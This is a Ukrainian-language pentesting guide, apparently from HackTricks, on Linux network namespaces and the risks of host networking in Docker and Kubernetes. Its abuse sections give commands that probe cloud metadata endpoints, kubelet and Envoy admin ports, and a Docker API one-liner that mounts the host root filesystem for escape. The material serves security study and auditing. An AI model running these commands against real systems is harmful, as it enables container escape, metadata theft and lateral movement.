# Мережевий простір імен

{{#include ../../../../../banners/hacktricks-training.md}}

## Огляд

Мережевий простір імен ізолює пов’язані з мережею ресурси, такі як інтерфейси, IP-адреси, таблиці маршрутизації, стан ARP/neighbor, правила firewall, сокети, абстрактний простір імен UNIX-domain сокетів і вміст файлів на кшталт `/proc/net`. Саме тому контейнер може мати власний `eth0`, власні локальні маршрути та власний loopback-пристрій, не володіючи реальною мережевою підсистемою host.

З погляду безпеки це важливо, оскільки мережева ізоляція — це значно більше, ніж прив’язування портів. Приватний мережевий простір імен обмежує те, що workload може безпосередньо спостерігати або переналаштовувати. Після спільного використання цього простору імен із host контейнер може раптово отримати видимість host listeners, локальних сервісів host, абстрактних кінцевих точок AF_UNIX і мережевих точок керування, які ніколи не призначалися для розкриття application.

## Робота

Щойно створений мережевий простір імен починається з порожнього або майже порожнього мережевого середовища, доки до нього не буде під’єднано інтерфейси. Після цього container runtimes створюють або під’єднують віртуальні інтерфейси, призначають адреси та налаштовують маршрути, щоб workload мав очікувану connectivity. У deployment на основі bridge це зазвичай означає, що контейнер бачить інтерфейс на основі veth, під’єднаний до host bridge. У Kubernetes CNI plugins виконують еквівалентне налаштування для Pod networking.

Ця архітектура пояснює, чому `--network=host` або `hostNetwork: true` є настільки суттєвою зміною. Замість отримання підготовленого приватного network stack workload приєднується до фактичного network stack host.

## Лабораторна робота

Ви можете побачити майже порожній network namespace за допомогою:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Також можна порівняти звичайні контейнери та контейнери, підключені до мережі хоста, за допомогою:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Контейнер із host networking більше не має власного ізольованого представлення сокетів та інтерфейсів. Уже сама ця зміна є суттєвою, ще до того, як ви почнете з'ясовувати, які capabilities має процес.

## Використання runtime

Docker і Podman зазвичай створюють приватний network namespace для кожного контейнера, якщо не налаштовано інше. Kubernetes зазвичай надає кожному Pod власний network namespace, спільний для контейнерів усередині цього Pod, але окремий від host. Це означає, що `127.0.0.1` зазвичай є локальним для Pod, а не для контейнера: listener, прив'язаний лише до localhost в одному контейнері, зазвичай доступний з його sidecar- і sibling-контейнерів. Системи Incus/LXC також забезпечують ізоляцію на основі network namespace, часто з ширшим набором конфігурацій віртуальної мережі.

Загальний принцип полягає в тому, що приватна мережа є стандартною межею ізоляції, тоді як host networking є явною відмовою від цієї межі.

## Неправильні конфігурації

Найважливіша неправильна конфігурація — це спільне використання host network namespace. Іноді це роблять заради продуктивності, низькорівневого моніторингу або зручності, але це усуває одну з найчіткіших доступних для контейнерів меж. Listener-и, локальні для host, стають доступними безпосередніше, сервіси, доступні лише через localhost, можуть стати доступними, а capabilities на кшталт `CAP_NET_ADMIN` або `CAP_NET_RAW` стають значно небезпечнішими, оскільки операції, які вони дозволяють, тепер застосовуються до власного мережевого середовища host.

Інша проблема — надмірне надання network-related capabilities навіть за наявності приватного network namespace. Приватний namespace справді допомагає, але не робить raw sockets або розширене керування мережею безпечними.

У Kubernetes параметр `hostNetwork: true` також змінює те, наскільки можна покладатися на мережеву сегментацію на рівні Pod. У документації Kubernetes зазначено, що багато network plugins не можуть належним чином відрізнити трафік Pod із `hostNetwork` під час зіставлення `podSelector` / `namespaceSelector` і тому обробляють його як звичайний трафік node. З погляду attacker це означає, що скомпрометований workload із `hostNetwork` часто слід розглядати як мережеву foothold на рівні node, а не як звичайний Pod, який і далі обмежений тими самими припущеннями політик, що й workloads в overlay network.

## Зловживання

У слабко ізольованих середовищах attackers можуть переглядати listening services на host, отримувати доступ до management endpoints, прив'язаних лише до loopback, перехоплювати або змінювати трафік залежно від конкретних capabilities і середовища, а також змінювати стан routing і firewall, якщо присутня `CAP_NET_ADMIN`. У кластері це також може спростити lateral movement і розвідку control plane.

Якщо ви підозрюєте використання host networking, почніть із перевірки того, що видимі interfaces і listeners належать host, а не ізольованій мережі контейнера:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Сервіси, доступні лише через loopback, часто є першою цікавою знахідкою:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Абстрактні UNIX-сокети — це ще одна ціль, яку легко не помітити, оскільки вони прив’язані до мережевого простору імен, хоча не виглядають як слухачі TCP/UDP і можуть не існувати як шляхи файлової системи в `/run`. Тому контейнер, що використовує мережу хоста, може успадкувати доступ до призначених лише для хоста каналів керування, які взагалі не монтувалися через bind mount у контейнер:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Історичним прикладом була вразливість із доступом до abstract socket `containerd-shim`, але ширший висновок важливіший за конкретний CVE: щойно workload приєднується до мережевого простору імен хоста, abstract AF_UNIX-сервіси також стають частиною поверхні атаки. Якщо такі сокети виглядають пов’язаними з runtime або адміністративними функціями, переходьте до [Runtime API та відкриття daemon](../../runtime-api-and-daemon-exposure.md).

Якщо присутні мережеві capabilities, перевірте, чи може workload переглядати або змінювати видимий мережевий стек:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
У сучасних ядрах host networking разом із `CAP_NET_ADMIN` може також надавати доступ до шляху проходження пакетів, що виходить за межі простих змін `iptables` / `nftables`. Qdisc і фільтри `tc` також мають область дії namespace, тому в спільному host network namespace вони застосовуються до інтерфейсів хоста, які може бачити контейнер. Якщо додатково присутній `CAP_BPF`, актуальними стають також пов’язані з мережею програми eBPF, як-от завантажувачі TC і XDP:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Це важливо, оскільки атакувальник може мати змогу дзеркалити, перенаправляти, формувати або відкидати трафік на рівні інтерфейсу хоста, а не лише переписувати правила firewall. У приватному network namespace ці дії обмежені представленням контейнера; у спільному namespace хоста вони починають впливати на host.

У кластерних або cloud-середовищах host networking також виправдовує швидкий локальний recon метаданих і сервісів, суміжних із control plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
У Kubernetes пам’ятайте, що компрометація **будь-якого** контейнера в multi-container Pod також надає доступ до localhost-слухачів, відкритих sibling-контейнерами та sidecar-контейнерами, оскільки весь Pod використовує один network namespace. Це особливо важливо для service-mesh, observability та helper-контейнерів, чиї адміністративні або debug-інтерфейси навмисно доступні лише всередині Pod, а не для всього кластера:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Вважайте, що «прив’язано до localhost» означає **приватне для Pod**, а не **приватне для контейнера**. Після компрометації одного контейнера в Pod це припущення більше не чинне.

### Повний приклад: Host Networking + доступ до локального Runtime / Kubelet

Host networking автоматично не надає root на host, але часто відкриває сервіси, які навмисно доступні лише з самого node. Якщо один із таких сервісів слабко захищений, host networking стає прямим шляхом до підвищення привілеїв.

Docker API на localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet на localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Вплив:

- прямий компроміс хоста, якщо локальний runtime API доступний без належного захисту
- розвідка кластера або lateral movement, якщо kubelet чи локальні агенти доступні
- маніпулювання трафіком або denial of service у поєднанні з `CAP_NET_ADMIN`

## Перевірки

Мета цих перевірок — з’ясувати, чи має процес приватний мережевий стек, які маршрути та слухачі видимі, а також чи виглядає мережеве представлення подібним до хостового ще до перевірки capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Що тут цікавого:

- Якщо `/proc/self/ns/net` і `/proc/1/ns/net` уже виглядають як такі, що належать хосту, контейнер може спільно використовувати мережевий namespace хоста або інший неприватний namespace.
- `lsns -t net` і `ip netns identify` корисні, коли shell уже перебуває всередині іменованого або persistent namespace, і потрібно зіставити його з об'єктами `/run/netns` на стороні хоста.
- `ss -lntup` особливо цінний, оскільки показує слухачі, доступні лише через loopback, і локальні management endpoints. `ss -xap` та `/proc/net/unix` доповнюють картину abstract socket, яку звичайний пошук socket у файловій системі пропускає.
- Маршрути, назви інтерфейсів, контекст firewall, стан `tc` і eBPF attachments стають набагато важливішими, якщо присутні `CAP_NET_ADMIN`, `CAP_NET_RAW` або `CAP_BPF`.
- У Kubernetes невдала роздільна здатність service name з Pod із `hostNetwork` може просто означати, що Pod не використовує `dnsPolicy: ClusterFirstWithHostNet`, а не те, що service відсутній.
- У multi-container Pod слухачі localhost належать усьому мережевому namespace Pod, тому перед тим, як вважати порт, доступний лише через loopback, недосяжним із compromised container, перевірте sidecars і sibling containers.

Під час перевірки контейнера завжди оцінюйте мережевий namespace разом із набором capabilities. Host networking у поєднанні з потужними network capabilities — це зовсім інша модель безпеки, ніж bridge networking із вузьким набором default capabilities.

## Посилання

- [Застереження щодо Kubernetes NetworkPolicy і `hostNetwork`](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [`network_namespaces(7)` у Linux та ізоляція abstract UNIX socket](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [Рекомендація containerd: abstract Unix domain sockets, доступні контейнерам із host-network](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [Вимоги до eBPF token і capabilities для мережевих eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
